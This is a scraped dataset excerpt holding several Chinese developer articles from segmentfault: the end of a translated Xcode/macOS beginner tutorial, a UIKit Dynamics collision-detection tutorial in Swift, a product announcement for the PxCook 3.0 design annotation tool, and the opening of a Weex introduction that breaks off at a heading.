<p>对 Label 做同样的事情，并把它命名为 <code>helloLabel</code>。<br>看一看 Xcode 自动生成的代码，你将会看见它们都以 <code>@IBOutlet</code> 开头，这是「Interface Builder Outlet」的缩写，也就是告诉 Storyboard 编辑器这些对象的名称是如何与视觉元素关联起来的。<br>对于那个按钮，代码中不需要给它起名字，但它需要知道用户何时点击了这个按钮。与 <code>@IBAction</code> 不同，这种连接叫做 <code>@IBAction</code>。<br>和先前一样，选中按钮，按住 Control⌃ 键的同时把文本框拖动到 <strong><em>ViewController.swift</em></strong> 中。这一次把 <strong><em>Connection</em></strong> 选项设置为 <strong><em>Action</em></strong>，并把 <strong><em>name</em></strong> 设置为 <code>sayButtonClicked</code>。这将会创建一个按钮被电击时会调用的一个函数。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000011137773"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>现在万事俱备，只差代码了！点击右侧编辑器面板右上角的「×」关闭 <strong><em>Assistant Editor</em></strong>，回到 <strong><em>ViewController.swift</em></strong>。如果你隐藏了 <strong><em>Navigator</em></strong>，点击右上角的按钮或按下 <strong><em>⌘1</em></strong> 来直接跳转到 <strong><em>Project Navigator</em></strong>。<br>把如下代码输入到 <code>sayButtonClicked</code> 函数中：</p>
<pre><code class=""swift"">var name = nameField.stringValue
if name.isEmpty {
    name = ""World""
}
let greeting = ""Hello \(name)!""
helloLabel.stringValue = greeting</code></pre>
<p>在删除了顶部自动生成的版权信息后，完成了的 <strong><em>ViewController.swift</em></strong> 中的代码看起来应该像下边截图中的一样。行号左边的小气泡表明这是一个 Stroyboard 与接口的连接点。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000011137774"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>现在编译并运行你的 app。<br>什么也不输入并点击 <strong><em>Say Hello</em></strong> 按钮，你将会看到「Hello World!」；而输入了你的名字之后再点击就能看到你专属的问候语了。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000011137775"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h2>调试</h2>
<p>有时，我们开发者会犯错——相信我，真的会的。当我们犯了错，就需要调试我们的代码。Xcode 允许我们在代码的任何一点暂停，然后一行一行地运行代码，让你检查每一行运行后各个变量的值，以此来找到错误。<br>在  <strong><em>ViewController.swift</em></strong> 中找到 <code>sayButtonClicked</code>，点击  <code>var name =</code>  左边的行号，一个蓝色的小旗子将会出现，这是一个激活了的断点，当你点击你 app 界面上的按钮时，调试器会让程序在这里暂停。再次点击它，它会变成浅浅的蓝色，这是一个未激活的断点，它将不会暂停代码，也不会启动调试器。要彻底移除一个断点，把它从行号那一条中拖出去即可。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000011137776"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>再次添加一个断点并运行你的 app，点击 <strong><em>Say Hello</em></strong> 按钮，Xcode 会移动到最顶层，并把有断点的那一行高亮显示。在 <strong><em>Editor</em></strong> 面板的最底部，将会有两个部分：<strong><em>Variables（变量）</em></strong>和 <strong><em>Console（控制台）</em></strong>。<strong><em>Variables</em></strong> 部分展示了此函数中用到的所有变量以及  <code>self</code>（也就是 View Controller）和 <code>sender</code>（也就是按钮）。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000011137777"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>在 <strong><em>Variables</em></strong> 部分的上方有几个控制调试器的按钮。请把鼠标挨个放在这些按钮上，根据弹出的工具提示看看他们是做什么的。点击 <strong><em>Step Over</em></strong> 按钮来运行下一行代码。<br>在 <strong><em>Variables</em></strong> 部分中，你可以看到 <code>name</code> 是一个空的字符串，所以再连续点击 <strong><em>Step Over</em></strong> 按钮两次，调试器会移动到 <code>if</code>语句中，并把 <code>name</code> 变量设置为「World」。<br>在 <strong><em>Variables</em></strong> 部分中选中 <code>Name</code> 变量，点击下方的 <strong><em>Quick Look</em></strong> 按钮来查看具体的内容，电击 <strong><em>Print Description</em></strong> 按可以把它的信息输出到 <strong><em>Console</em></strong> 部分中。如果「World」没有被正确地设置，你应该能在这里看到，并想出对应的对策。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000011137778"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>当你检查完所有的变量内容后，点击 <strong><em>Continue program execution</em></strong> 按钮来停止调试，并让程序继续运行。你可以使用界面右上角的按钮来隐藏调试器。</p>
<h2>图像</h2>
<p>除了代码和 UI，你的 app 还需要一些图像。根据屏幕的不同（Retina 显示屏和非 Retina 显示屏），你经常需要为一套资产提供多个版本。为了简化这个流程，Xcode 使用 <strong><em>Asset Libraries</em></strong> 来存储和管理这些 app 需要的资产。<br>在 <strong><em>Project Navigator</em></strong> 中点击 <strong><em>Assets.xcassets</em></strong>，到目前为止里边只有一个 <strong><em>AppIcon</em></strong>，它包含了不同分辨率下的 app 的图标。点击 <strong><em>AppIcon</em></strong>，你会看到它需要 10 个不同的图片来照顾所有的情况，但如果你只提供了一个，那么 Xcode 会尽量让它发挥最大功效，但这并不是一个正确的做法——你需要尽力为你的 app 提供所有尺寸的图标，但在这个教程中，我们只准备了一个图标。<br>下载 512×512 像素的<a href=""https://koenig-media.raywenderlich.com/uploads/2017/02/rw_logo.png.zip"" rel=""nofollow noreferrer"">示例图标</a>，把它拖动到 <strong><em>Mac 512pt 1x</em></strong> 的方框中。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000011137779"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>编译并运行你的 app，查看 Dock 栏中的图标，如果你看到的还是默认图标，请在 <strong><em>Product</em></strong> 菜单中选择 <strong><em>Clean</em></strong>，然后再次运行。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000011137780"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h2>获得帮助</h2>
<p>除了一个编辑器，Xcode 还包含了你编写 macOS app 所需要的所有文档。<br>在 <strong><em>Help</em></strong> 菜单中选择 <strong><em>Documentation and API Reference</em></strong>。搜索 <strong><em>NSButton</em></strong>，请确保当前选中的语言是 Swift，只需点击顶部的搜索结果，就可以找到所有关于按钮的信息了。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000011137781"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>还有一种方法，可以在你的代码中直接查看相关的文档，返回 <strong><em>ViewController.swift</em></strong>，找到 <code>sayButtonClicked</code> 所在的行，按住 Option⌥ 键的同时点击 <code>stringValue</code>，一个快速的查询面板将会弹出，在底部还有一个 <strong><em>Property Reference</em></strong> 的链接，点击它就可以在文档中查看更多信息。<br><strong><em>Option⌥ +鼠标点击</em></strong>是一个特别好的学习方式，你甚至可以为你自己编写的函数添加自己编写的文档，以便今后快速查阅。<br><strong><em>Help</em></strong> 菜单中还包括了 <strong><em>Xcode Help</em></strong>，在这里你可以了解到更多的 Xcode 信息。</p>
<hr>
<h2><a href=""https://segmentfault.com/a/1190000011319297"" rel=""nofollow noreferrer"">下一趴：零基础 macOS 应用开发（二）?</a></h2>

                ", [译] 零基础 macOS 应用开发（一）,1531971917,490,1,979,1,1,https://segmentfault.com/a/1190000011137754
42,1,0,6,"
                    
<blockquote><p>作者：Arthur Knopper，<a href=""https://www.ioscreator.com/tutorials/collision-detection-uikit-dynamics-ios-tutorial-ios10"" rel=""nofollow noreferrer"">原文链接</a>，原文日期：2017-04-20<br>译者：<a href=""http://www.jianshu.com/users/7a2d2cc38444/latest_articles"" rel=""nofollow noreferrer"">Crystal Sun</a>；校对：<a href=""http://chengway.in/"" rel=""nofollow noreferrer"">walkingway</a>；定稿：<a href=""https://github.com/chenmingbiao"" rel=""nofollow noreferrer"">CMB</a></p></blockquote>
<p>用 UIKit Dynamics 可以让指定对象具备碰撞行为。动态的项目能相互碰撞或者和任何指定的边界碰撞。在本节教程中，将学习创建自行一的边界，随机地让一些方块下落到边界上。本节教程使用的是 Xcode 8.3 和 iOS 10.3。</p>
<h3>设置工程</h3>
<p>打开 Xcode，创建一个 Single View Application 工程。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000009472115?w=730&amp;h=518"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>Product Name 使用 <strong>IOS10CollisionDectectionTutorial</strong>（译者注：这里的 Dectection 估计是错别字，应该是 Detection），填写自己的 Organization Name 和 Organization Identifier，Language 一栏选择 Swift，Devices 一栏选择 iPhone。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000011065416"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>用自定义的 UIView 画一些线，在 drawRect 方法中写点代码。选择 File -&gt; New File -&gt; iOS -&gt; Source -&gt; Cocoa Touch Class。Class 命名为 LineView，其父类为 UIView。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000011065416"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>打开 <strong>LineView.swift</strong> 文件，想要画线需要先创建一个帮手：<strong>drawLineFromPoint(fromX:toPoint:pointY:)</strong> 方法。</p>
<pre><code>
func drawLineFromPoint(fromX: CGFloat, toPoint toX: CGFloat, pointY y: CGFloat) {
    let currentContext = UIGraphicsGetCurrentContext()
        
    if let currentContext = currentContext {
        currentContext.setLineWidth(5.0)
        currentContext.move(to: CGPoint(x: fromX, y: y))
        currentContext.addLine(to: CGPoint(x: toX, y: y))
        currentContext.strokePath();
    }}
</code></pre>
<p>线的宽度为 5 points。接下来，改写 <strong>drawRect</strong> 方法：</p>
<pre><code>
override func draw(_ rect: CGRect) {
        
    drawLineFromPoint(fromX: 0, toPoint: bounds.size.width/3, pointY: bounds.size.height - 100.0)
    drawLineFromPoint(fromX: bounds.size.width/3, toPoint:bounds.size.width*0.67, pointY:bounds.size.height - 150.0)
    drawLineFromPoint(fromX: bounds.size.width*0.67, toPoint:bounds.size.width, pointY:bounds.size.height - 100.0)}
</code></pre>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000011065417"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p><strong>运行</strong>工程，线已经出现在屏幕上了。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000011065418"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>接下来，拖拽一个 Button 控件到 Storyboard 上，标题改为 “Next”。选中该 Button，点击 Auto Layout 的 Align 按钮，勾选 “Horizontally in Container”，点击 “Add 1 Constraint”。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000011065419"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>继续选中该 Button，点击 Auto Layout 的 Pin 按钮，选中上边距的约束线，点击 “Add 1 Constraint”。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000011065420"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>主界面看起来应如下图所示：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000011065421"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>点击 Assistant Editor，确保 ViewController.swift 文件可见，按住 Control 键将该 Button 拖拽到 ViewController 类里，创建下列 Action 链接：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000011065422"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>在 <strong>ViewController.swift</strong> 文件中，需要声明一些变量，来跟踪记录 view，如下所示：</p>
<pre><code>
var squareViews:[UIView] = []
var animator:UIDynamicAnimator!
var colors:[UIColor] = []
var centerPoint:[CGPoint] = []
var sizeOfSquare:CGSize!
</code></pre>
<p>squareViews 将包含所需的 view，view 需要颜色数组、centerPin 数组和 sizeOfSquare（方块的大小）这些属性。animator 属性要用于动画动作。接下来继续添加下列属性：</p>
<pre><code>
var leftBoundaryHeight:CGFloat!
var middleBoundaryHeight:CGFloat!
var rightBoundaryHeight:CGFloat!
var leftBoundaryWidth:CGFloat!
var middleBoundaryWidth:CGFloat!
var leftSquareCenterPointX:CGFloat!
var middleSquareCenterPointX:CGFloat!
var rightSquareCenterPointX:CGFloat!
var squareCenterPointY:CGFloat!
</code></pre>
<p>需要上述属性来设置自定义的边界，给所有的方块添加一个起始点。首先，创建 setBoundaryValues 方法来设置上述属性。</p>
<pre><code>
func setBoundaryValues() {
    leftBoundaryHeight = view.bounds.size.height - 100.0
    middleBoundaryHeight = view.bounds.size.height - 150.0
    rightBoundaryHeight = view.bounds.size.height - 100.0
    leftBoundaryWidth = view.bounds.size.width/3
    middleBoundaryWidth = view.bounds.size.width * 0.67
    leftSquareCenterPointX = view.bounds.size.width/6
    middleSquareCenterPointX = view.bounds.size.width/2
    rightSquareCenterPointX = view.bounds.size.width * 0.84
    squareCenterPointY = view.bounds.size.height - 400
}
</code></pre>
<p>在 <strong>viewDidLoad</strong> 里，调用上述方法。然后设置剩下的属性。</p>
<pre><code>
override func viewDidLoad() {
    super.viewDidLoad()
        
    setBoundaryValues()
            
    // 创建颜色数组
    colors = [UIColor.red, UIColor.blue, UIColor.green, UIColor.purple, UIColor.gray]
            
    // 创建方块的中心点（centerpoint）
    let leftCenterPoint = CGPoint(x: leftSquareCenterPointX, y: squareCenterPointY)
    let middleCenterPoint = CGPoint(x: middleSquareCenterPointX, y: squareCenterPointY)
    let rightCenterPoint = CGPoint(x:rightSquareCenterPointX, y: squareCenterPointY)
    centerPoint = [leftCenterPoint,middleCenterPoint,rightCenterPoint]
            
    // 设置方块的大小
    sizeOfSquare = CGSize(width: 50.0, height: 50.0) 
}
</code></pre>
<p>好了，现在每个 view 的尺寸是 50，有 5 种不同的颜色。接下来的事情都会在 <strong>releaseNextSquare(sender:)</strong> 方法中发生。</p>
<pre><code>
@IBAction func releaseSquare(_ sender: Any) {
    let newView = UIView(frame: CGRect(x: 0.0, y: 0.0, width: sizeOfSquare.width, height: sizeOfSquare.height))
        
    let randomColorIndex = Int(arc4random()%5)
    newView.backgroundColor = colors[randomColorIndex]
        
    let randomCenterPoint = Int(arc4random()%3)
    newView.center = centerPoint[randomCenterPoint]
        
    squareViews.append(newView)
    view.addSubview(newView)
}
</code></pre>
<p>创建了 view，centerPoint 的值是随机数，也赋值了颜色，该 view 被添加到了主界面上，也被添加到了数组中。在 <strong>releaseSquare(sender:)</strong> Action 方法的最后，添加剩下的代码。</p>
<pre><code>
animator = UIDynamicAnimator(referenceView: view)

// 创建重力
let gravity = UIGravityBehavior(items: squareViews)
animator.addBehavior(gravity)

// 创建碰撞检测
let collision = UICollisionBehavior(items: squareViews)
        
// 设置碰撞的边界
collision.addBoundary(withIdentifier: ""leftBoundary"" as NSCopying, from: CGPoint(x: 0.0,y: leftBoundaryHeight), to: CGPoint(x: leftBoundaryWidth, y: leftBoundaryHeight))
collision.addBoundary(withIdentifier: ""middleBoundary"" as NSCopying, from: CGPoint(x: view.bounds.size.width/3,y: middleBoundaryHeight), to: CGPoint(x: middleBoundaryWidth, y: middleBoundaryHeight))
collision.addBoundary(withIdentifier: ""rightBoundary"" as NSCopying, from: CGPoint(x: middleBoundaryWidth,y: rightBoundaryHeight), to: CGPoint(x: view.bounds.size.width, y: rightBoundaryHeight))
        
collision.collisionMode = .everything
animator.addBehavior(collision)
</code></pre>
<p>首先，给方块下落的动作增加了重力，接下来，在自定义边界的基础上添加了碰撞行为。默认的碰撞模式是 UICollisionBehaviour 里的 UICollisionBehaviourMode.everything，也就是说，所有的元素都可以互相碰撞。<strong>运行</strong>工程，不停地按 Next 按钮，方块下落。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000011065423"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>可以从 <a href=""https://github.com/ioscreator/ioscreator"" rel=""nofollow noreferrer"">github</a> 上下载 <strong>IOS10CollisionDectectionTutorial</strong> 教程的源代码。</p>
<blockquote><p>本文由 SwiftGG 翻译组翻译，已经获得作者翻译授权，最新文章请访问 <a href=""http://swift.gg"" rel=""nofollow noreferrer"">http://swift.gg</a>。</p></blockquote>

                ", 如何用 UIKit Dynamics 进行碰撞检测,1531971926,405,1,155,1,1,https://segmentfault.com/a/1190000011065411
43,1,0,6,"
                    
<blockquote><p>这世上哪有什么天才，有的人只是把大家设计标注、写前端的时间拿来喝咖啡，和思考罢了</p></blockquote>
<p><span class=""img-wrap""><img data-src=""/img/bVUhyy?w=306&amp;h=70"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p><strong>PxCook 3.0是什么</strong></p>
<p>设计师一键拖拽上传，可智能标注，支持画板、项目。做完后导出的pxcp 程序员点击即可生成css xml swift objective-c还有ReactNative的代码了。</p>
<p><strong>字多不看求图</strong><br><span class=""img-wrap""><img data-src=""/img/bVUhPG?w=952&amp;h=618"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span><br>（走心要听：<br>作为一个深耕设计师软件的团队。这次3.0版本。相比于之前更加高效，易用。依然支持 <strong>Win &amp; Mac</strong> ，并且是支持<strong>PS</strong>和<strong>Sketch</strong>的全平台工具。<br><strong>“拖拽即用”</strong>和<strong>“一键流”</strong>的理念我想互联网行业的都明白它的易用性的含义。这不但体现在设计稿导入上，智能标注和生成代码也是一样。</p>
<h2>开发模式 : 直接生成代码</h2>
<p>点击顶部的tab按钮能切换到程序猿模式<br><span class=""img-wrap""><img data-src=""/img/bVUhY5?w=184&amp;h=36"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>在这一模式下，拖拽进来的psd和上传的sketch可以通过点击直接生成<strong>CSS XML Objective-C Swift ReactNative 等</strong>前端代码。<br>包括多种开发语言下<strong>的尺寸文字、阴影渐变等</strong>所有元素。<br><span class=""img-wrap""><img data-src=""/img/bVUhY8?w=952&amp;h=618"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>CSS 支持点击生成<br><span class=""img-wrap""><img data-src=""/img/bVUhZa?w=386&amp;h=160"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>XML 点击生成 yes yes<br><span class=""img-wrap""><img data-src=""/img/bVUhZh?w=457&amp;h=184"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>OC 点击生成，three yeses<br><span class=""img-wrap""><img data-src=""/img/bVUhZk?w=386&amp;h=353"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>Swift，Yes！Taylor No<code>`</code>`<br><span class=""img-wrap""><img data-src=""/img/bVUhZs?w=386&amp;h=353"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>ReactNative，生成支持ㄟ( ▔, ▔ )ㄏ<br><span class=""img-wrap""><img data-src=""/img/bVUhZo?w=386&amp;h=255"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>直接生成代码至少每周为团队节省数小时甚至更多的工作时间。</p>
<h2>对项目的支持</h2>
<p><strong>什么是项目？</strong><br>(<em>/ω＼</em>)~项目是个方便设计管理标注的杂货箱，某个psd/sketch中的某一个<strong>画板</strong>，某个没有画板的单独<strong>psd/sketch</strong>，某个老的<strong>pxc</strong>格式文件或某个和文件没有关联的单独标注<strong>png</strong>……这些文件类型不同，但是可能和某个界面或某个功能、版本相关，这些都可以<strong>整理到一个项目</strong>内。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVUhYF?w=952&amp;h=620"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span><br>项目列表展示</p>
<h2>智能标注</h2>
<p>流畅的智能标注是2016年上线以来口碑最好的功能，他的易用性体现在对于设计师的交互简单<br><span class=""img-wrap""><img data-src=""/img/bVUhTh?w=340&amp;h=265"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>这回的大版本保留了智能标注，并增加了画板的支持。</p>
<h2>画板支持</h2>
<p>小解释画板是个什么。PS自2015起推出了画板功能，可以说是ui设计师最常用的分类/汇总功能（Sketch一直支持）。同时也是我们2个种子用户群呼声最高的。<br><span class=""img-wrap""><img data-src=""/img/bVUhUC?w=2334&amp;h=1418"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span><br>☝ 上图是Ps和Sketch的画板<br>（而以下，PxCook3.0已经支持导入和分别显示画板了。☟<br><span class=""img-wrap""><img data-src=""/img/bVUhU4?w=951&amp;h=619"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p><strong>PS拖入：</strong>直接将psd拖拽进来即可，记得要勾选要导入哪些画板哟。<br><span class=""img-wrap""><img data-src=""/img/bVUhR0?w=952&amp;h=618"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""psd可直接拖拽，sketch通过插件上传"" title=""psd可直接拖拽，sketch通过插件上传""></span></p>
<p>Sketch导入：通过插件快速上传<br><span class=""img-wrap""><img data-src=""/img/bVUhYm?w=823&amp;h=500"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<h2>角色切换 — 设计师模式</h2>
<p>首先介绍以下开发和设计师的模式区分<br><span class=""img-wrap""><img data-src=""/img/bVUhYR?w=184&amp;h=36"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>PxCook3.0可以通过的顶部tab切换角色——<strong>设计</strong>和<strong>开发</strong>两个角色。</p>
<p><strong>设计模式</strong>下可以标注。无论是交互友好的智能标注还是手动加距离/文字/坐标都是可以的。<br><span class=""img-wrap""><img data-src=""/img/bVUhTh?w=340&amp;h=265"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>它主要包括：</p>
<ul>
<li><p>元素间的尺寸可以拖动<strong>直接生成</strong></p></li>
<li><p>元素内间距也能一键生成</p></li>
<li><p>字体信息标注（字号字体颜色是否加粗等）<strong>一键流</strong></p></li>
<li><p>……</p></li>
</ul>
<p>设计师想要的，PxCook基本都想了， 毕竟用户反馈收集是一直在做的。</p>
<h2>UI的调整</h2>
<p>每次的UI调整，我们都愿意展开讲<br>因为界面是需要磨的，就像所有曾出现过的设计一样。因为环境在变，人也随着思考。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVUhZ2?w=267&amp;h=303"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span><br>首先的调整就是把智能标注的图标放在了左侧，体现从属关系。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVUhZ9?w=253&amp;h=42"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span><br>切图也放在顶部更明显的位置。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVUh0r?w=1177&amp;h=740"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span><br>还有字体单位的选择移到了设计页和项目页顶部，#Hex和ARGB等。</p>
<hr>
<p><strong>戏太足的开发小队：</strong></p>
<p>“ PxCook 3.0设计的初衷，是在不打扰设计师的前提下，提供完整的项目管理与呼声最高的画板功能。并提供给程序智能开发模式 ~<br>从两个用户群的反馈来看，还不错还不错~我们也在做着下一步功能。<br>在路上 =]   ”</p>
<p><strong>PxCook 3.0 获取途径：</strong><br>前往官网下载：<a href=""http://www.fancynode.com.cn/pxcook"" rel=""nofollow noreferrer"">http://www.fancynode.com.cn/p...</a><br>我们也会定期在公众号：<a href=""https://mp.weixin.qq.com/s?timestamp=1510216080&amp;src=3&amp;ver=1&amp;signature=qmn1IsRtGkSXORGKr9DZzMkJCRLCKkG4V-OFwVAwxqyWK7a08Ektw7SNDWXzKKmDW0MjeblMup5j"" rel=""nofollow noreferrer"">PxCook</a>  发布其他效率工具与日常更新</p>
<p><strong>Sketch上传插件 获取途径：</strong><br>前往官网：<a href=""http://www.fancynode.com.cn/flavor"" rel=""nofollow noreferrer"">http://www.fancynode.com.cn/f...</a><br>其实这个插件也是个大杀器，对效率提升也非常之大叫作Flavor <a href=""http://www.jianshu.com/p/5bb0d8e6a9ac"" rel=""nofollow noreferrer"">Flavor - Sketch插件味增，给你的设计加点料</a></p>
<p>​<strong>问题反馈与联系</strong></p>
<p>任何问题反馈欢迎来提(｡・`ω´･)<br>官方微博：<a href=""https://weibo.com/fancynode"" rel=""nofollow noreferrer"">@Fancynode</a><br>qq用户群：<a href=""https://jq.qq.com/?_wv=1027&amp;k=5wg6UD1"" rel=""nofollow noreferrer"">661255798</a></p>
<p>​<span class=""img-wrap""><img data-src=""/img/bVUhyy?w=306&amp;h=70"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>​</p>

                ", 下个时代的前端研发，效率还能提升。PxCook 3.0，最高效的设计研发利器,1531971928,566,1,553,1,1,https://segmentfault.com/a/1190000011035490
44,1,0,6,"
                    
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000012869672"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<blockquote>自打出生的那一天起，Weex 就免不了被拿来同 React Native「一决高下」的命运。React Native 宣称「Learn Once, Write Anywhere」，而 Weex 宣称「Write Once, Run Everywhere」。在我看来，并没有谁更好，只有谁更合适。下面我将围绕 Weex 入门进行讲解。<br>（如果你尚不了解 React Native，并想简单入门，可以阅读<a href=""https://github.com/zwwill/blog/issues/9"" rel=""nofollow noreferrer"">【整理】React Native 快速入门笔记</a>）</blockquote>
<h1>网易严选 App 感受 Weex 开发</h1>
<p>什么都不说，先给你感受下 Weex 的效果。以下就是我使用 Weex，4*8h（不连续）做出来的 demo，其中还包括素材收集，踩坑总结等时间。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000012846334?w=1266&amp;h=727"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""demo 截图"" title=""demo 截图""></span></p>
<blockquote>此处是 demo 源码：<br><a href=""https://github.com/zwwill/yanxuan-weex-demo"" rel=""nofollow noreferrer"">https://github.com/zwwill/yanxuan-weex-demo</a>
</blockquote>
<p>不得不说，使用 Weex 开发 app 对于我们纯前端人员来说，是件「<strong><em>很爽</em></strong>」的事情，只要你熟悉了他的语法，基本可以做到一周上手写 app。极其适合交互要求不高，时间紧迫，人手不足的同构开发需求。</p>
<p>但是，当然有但是，如果你想写出一个完美的 app，你就需要在性能优化上下很大的功夫，包括动画的优化，过场的优化，图片的优化，细节的打磨等等，再者，就是你需要掌握或者「能写」一些原生的代码，不然有些功能你是实现不了的，比如 status bar 的属性更改，开场动画的制作，内存的回收，webview 的监听等等。</p>
<p>下面我们具体讲讲入门知识</p>
<h1>Write Once, Run Everywhere</h1>
<p>Weex 提供了多端一致的技术方案。</p>
<ul>
<li>首先，Weex 的开发和 web 开发体验可以说是几乎一样。包括语法设计和工程链路等。</li>
<li>其次，Weex 的组件、模块设计都是 iOS、Android、Web 的开发者共同讨论出来的，有一定的通用性和普遍性。</li>
<li>Weex 开发同一份代码，可以在不同的端上分别执行，避免了多端的重复研发成本。</li>
</ul>
<p>在同构这条路上，Weex 比 React Native做得更彻底，他「几乎」做到了，「你来使用 vue 写一个webapp，我顺便给你编译成了 ios 和 android 的原生 app」</p>
<p>至于为什么要造这个轮子，官方给了以下说法</p>
<blockquote>1、今天在技术社区有大量的 web 开发者，Weex 可以赋能更多的 web 开发者构建高性能和高体验的移动应用。<br>2、Web 开发本身具有非常强的高效率和灵活性，这和 Weex 想解决的移动端动态性问题不谋而合。<br>3、Web 标准和开发体验是很多顶尖而优秀的科技公司共同讨论和建设的结果，本身的设计和理念都有极高的品质保障<br>4、同时 Weex 也希望可以借此机会努力为标准贡献一点自己的微薄之力。<br>5、Web 是一种标准化的技术，标准本身就是一种力量，基于标准、尊重标准、贴近标准都意味着拥有更多的可能性。<br>6、Web 今天的生态和社区是非常繁荣的，有很多成熟的工具、库、工程体系、最佳实践可以使用、引入和借鉴。</blockquote>
<p>在我看来，Weex 其实是 Alibaba 团队提高生产效率的产物，在淘宝这类要求多端统一迭代快速的部门，三端约定一种便于统一的规范，在加上时间的发酵，渐渐的就有了此类脚手架的雏形，同时在脸书 React Native 开源带来的极大轰动后，自己也坐不住了吧^_^</p>
<p>好了，闲话就说到这，下面就来让我们解剖一下WEEX的优劣良莠。</p>
<h1>预科</h1>
